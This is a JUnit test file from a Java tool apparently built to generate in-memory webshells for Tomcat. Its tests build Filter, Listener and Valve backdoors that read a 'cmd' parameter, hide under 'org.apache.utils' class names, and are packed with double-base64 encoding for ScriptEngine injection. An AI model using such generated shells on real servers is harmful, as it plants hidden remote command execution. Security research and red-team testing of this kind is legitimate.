package com.reajason.javaweb.memshell.tomcat.command;

import com.reajason.javaweb.memshell.*;
import com.reajason.javaweb.memshell.config.CommandConfig;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.generator.command.CommandGenerator;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandListener;
import com.reajason.javaweb.memshell.shelltool.command.CommandValve;
import com.reajason.javaweb.util.ClassUtils;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.params.provider.Arguments.arguments;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
class CommandFilterTest {

    static Stream<Arguments> casesProvider() {
        return Stream.of(
                arguments(ShellType.FILTER, CommandFilter.class, "org.apache.utils.CommandFilter"),
                arguments(ShellType.LISTENER, CommandListener.class, "org.apache.utils.CommandListener"),
                arguments(ShellType.VALVE, CommandValve.class, "org.apache.utils.CommandValve")

        );
    }

    @ParameterizedTest
    @MethodSource("casesProvider")
    void generate(String shellType, Class<?> clazz, String className) {
        ShellConfig generateConfig = new ShellConfig();
        CommandConfig commandConfig = CommandConfig.builder()
                .shellClass(clazz)
                .shellClassName(className)
                .paramName("cmd")
                .build();
        generateConfig.setShellType(shellType);
        byte[] bytes = new CommandGenerator(generateConfig, commandConfig).getBytes();
        Object obj = ClassUtils.newInstance(bytes);
        assertEquals(commandConfig.getShellClassName(), obj.getClass().getName());
        assertEquals(commandConfig.getParamName(), ClassUtils.getFieldValue(obj, "paramName"));
    }

    @Test
    void testGenerator() throws Exception {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Tomcat)
                .shellType(ShellType.FILTER)
                .shellTool(ShellTool.Command)
                .build();

        CommandConfig commandConfig = CommandConfig.builder()
                .shellClass(CommandFilter.class)
                .shellClassName("org.apache.utils.CommandFilter")
                .paramName("cmd")
                .encryptor(CommandConfig.Encryptor.DOUBLE_BASE64)
                .build();
        InjectorConfig injectorConfig = new InjectorConfig();

        GenerateResult generate = MemShellGenerator.generate(shellConfig, injectorConfig, commandConfig);
//        Files.write(Paths.get("hehe.class"), generate.getShellBytes());
        String pack = Packers.ScriptEngine.getInstance().pack(generate);
        System.out.println(pack);
    }
}